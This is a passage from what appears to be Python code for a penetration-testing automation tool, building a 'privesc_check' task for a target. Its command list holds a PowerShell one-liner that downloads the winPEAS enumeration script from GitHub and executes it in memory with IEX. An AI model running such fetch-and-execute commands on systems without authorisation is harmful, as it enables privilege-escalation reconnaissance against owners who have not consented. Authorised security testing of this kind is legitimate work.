                    "powershell -c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')",
                ]
            return {"type": "privesc_check", "target": target, "commands": cmds}
        
        raise ValueError(f"Unknown: {task_type}")
